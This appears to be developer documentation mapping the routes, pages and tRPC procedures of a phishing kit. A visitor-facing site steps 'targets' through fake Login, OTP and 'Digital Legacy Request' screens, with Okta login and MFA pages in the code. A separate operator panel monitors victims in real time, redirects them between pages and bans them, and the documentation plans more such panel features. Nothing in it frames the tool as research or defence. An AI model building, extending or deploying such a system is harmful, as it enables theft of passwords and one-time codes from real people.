# Pages and HTTP Routes

## Next.js (file-based) routes

### Visitor routes (protected by TropicProvider)

| Path | File | Description |
|------|------|-------------|
| `/` | `app/page.jsx` | Root route. Renders an empty fragment; the actual UI is rendered by `TropicProvider` from layout wrappers. |

### Panel (separate sub-project at `panel/`)

The panel is a **separate Next.js app** in `panel/`, not integrated into the main site. It runs on its own port and calls the main site's tRPC API.

| Path | File | Description |
|------|------|-------------|
| `/` | `panel/app/page.jsx` | Redirects to `/home` or renders Intake Monitor. |
| `/login` | `panel/app/login/page.jsx` | Operator login form. |
| `/home` | `panel/app/home/page.jsx` | Intake Monitor: domain config, Pending Visitors, Active Visitors. |
| `/[targetId]` | `panel/app/[targetId]/page.jsx` | Session view for a specific visitor. |

### API routes

| Path | File | Description |
|------|------|-------------|
| `/api/trpc/[trpc]` | `app/api/trpc/[trpc]/route.js` | tRPC endpoint used by queries, mutations, and subscriptions. |

---

## Logical pages (in-app flow steps)

The app is a single-flow UI. Visible page is derived from:

- `gameplan.pages[intakeState.gameplan_step]?.name`
- Source: `app/(tropic)/TropicProvider.jsx`

### Active flow pages

| Page name | Component | Description |
|-----------|-----------|-------------|
| `Login` | `app/components/Login/Login.jsx` | Username/email + password step. |
| `OTP` | `app/components/Otp/Otp.jsx` | OTP code verification step. |
| `Digital Legacy Request` | `app/components/DigitalLegacy/DigitalLegacy.jsx` | Legacy request approval/block flow. |
| `Success` | `app/components/Success/Success.jsx` | Final confirmation screen. |

### Planned flow pages (pp banging panel integration)

| Page name | Component | Description |
|-----------|-----------|-------------|
| `Loading` | Loader or dedicated component | Full-screen loading state; operator can Queue/Redirect to it. |
| (waiting) | `app/components/WaitingScreen/WaitingScreen.jsx` | Shown when target `status === 'pending'`; visitor waits for operator to Accept. |

### In codebase but not currently rendered by active flow

| Page name (commented mapping) | Component path |
|-------------------------------|----------------|
| `Okta Login` | `app/components/OktaLogin/*` |
| `Okta MFA` | `app/components/OktaMFA/*` |
| `Okta Timekill` | (not present in current repo) |
| `Okta Success` | `app/components/Success/Success.jsx` |
| `Okta Script Execution` | (not present in current repo) |

---

## HTTP/API surface

### API routes

| Method | Path | Handler | Notes |
|--------|------|---------|-------|
| `GET` / `POST` | `/api/trpc/[trpc]` | `app/api/trpc/[trpc]/route.js` | Entrypoint for all tRPC procedures. |

### tRPC procedures (logical API)

Defined in `app/server/trpc/router.js`:

**Current (visitor flow):**
- `targets.create`
- `intakeState.getByTarget`
- `intakeState.incrementStep`
- `intakeState.onUpdate` (subscription)
- `gameplans.getByTarget`
- `gameplans.onUpdate` (subscription)
- `intakeEvents.listByTarget`
- `intakeEvents.add`
- `intakeEvents.onUpdate` (subscription)
- `checkpoints.existsWaiting`
- `checkpoints.resolveDual`
- `checkpoints.onResolution` (subscription)
- `intakePages.isActive`

**Planned (pp banging panel):**
- `targets.getById` — target with status
- `targets.accept` — set status to `active`
- `targets.deny` — set status to `ended`
- `targets.endAndBan` — set status to `banned`
- `targets.listPending` — targets with `status = 'pending'`
- `targets.listActive` — targets with `status = 'active'`
- `intakeState.setStep` — set `gameplan_step`
- `intakeState.setForceLoad` — set `force_load`
- `gameplans.updatePages` — replace pages array
- `gameplans.appendPage` — add page to end
- `gameplans.redirectToPage` — set step by page name
- `domains.getConfig` — allow_new_visitors, default_pages
- `domains.updateConfig` — update domain config
- `presets.getByTarget` — presets for a target
- `presets.upsert` — create/update presets
- `checkpoints.listPendingByTarget` — waiting checkpoints for Submission Controls
- `checkpoints.latest` — latest waiting/resolved checkpoint by resolution

---

## Server actions and client helpers (not HTTP paths)

| Module | File | Purpose |
|--------|------|---------|
| `createTarget` | `app/actions/createTarget.js` | Server action to create a target row in PostgreSQL via Prisma. Planned: set `status: 'pending'`; return `{ closed: true }` when `allow_new_visitors` is off. |
| `getTargetId` | `app/(tropic)/getTargetId.js` | Reads/creates `target_id` cookie and calls `createTarget` when needed. Planned: handle `closed` response. |
| `proceedStep` | `app/(tropic)/proceedStep.js` | Calls tRPC mutation to increment `gameplan_step`. |
| `addIntakeEvent` | `app/(tropic)/addIntakeEvent.js` | Calls tRPC to insert intake event. |
| `checkForExistingCheckpoint` | `app/(tropic)/checkForExistingCheckpoint.js` | Calls tRPC to detect waiting checkpoint. |
| `resolveDualCheckpoint` | `app/(tropic)/resolveDualCheckpoint.js` | Calls tRPC to resolve checkpoint outcome. |

**Panel:** `panel/app/actions/login.js` — verify credentials, set session cookie, redirect to `/home`.

---

## Middleware

| File | Current behavior |
|------|------------------|
| `middleware.js` | Pass-through (`NextResponse.next()`). Bot/page-active checks are currently commented out. |

**Planned:** Panel has its own `panel/middleware.js` to protect routes (except `/login`).

---

## Layout structure

- **Main site** (`app/layout.js`): `TRPCProvider` → `TropicProvider` → `{children}` (unchanged)
- **Panel** (`panel/app/layout.jsx`): Separate app; dark theme shell; nav: Panel, Manage pages, URL Shortener, Account. No TropicProvider.

---

## Summary

- **URL routes (main site):** `/`, `/api/trpc/[trpc]`
- **Panel (separate app):** `/`, `/login`, `/home`, `/[targetId]` on its own port
- **Visitor flow:** `Login`, `OTP`, `Digital Legacy Request`, `Success` (plus planned `Loading`, WaitingScreen)
- **Panel flow:** Intake Monitor (home), Session view (per target)
- **API model:** Single tRPC endpoint with typed procedures/subscriptions
- **Server entry points:** `createTarget` server action, panel login action, tRPC router procedures
